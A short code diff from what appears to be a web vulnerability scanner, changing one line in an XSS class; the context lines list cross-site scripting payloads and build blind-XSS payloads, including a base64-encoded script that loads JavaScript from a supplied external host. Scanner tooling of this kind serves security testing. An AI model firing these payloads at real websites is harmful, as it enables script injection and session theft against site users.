@@ -8,7 +8,7 @@ from base64 import b64encode
 class XSS:
     def __init__(self,host=None):
         self.payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src=x OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','<x/oncopy=brrrr>x']
-        self.blind = []
+        self.blind = list()
         if host:
             b = b64encode(f'var a=document.createElement("script");a.src="{host}";document.body.appendChild(a);'.encode('utf-8')).decode('utf-8').replace('=','')
             self.payloads.append(f'"><script src={host}></script>')
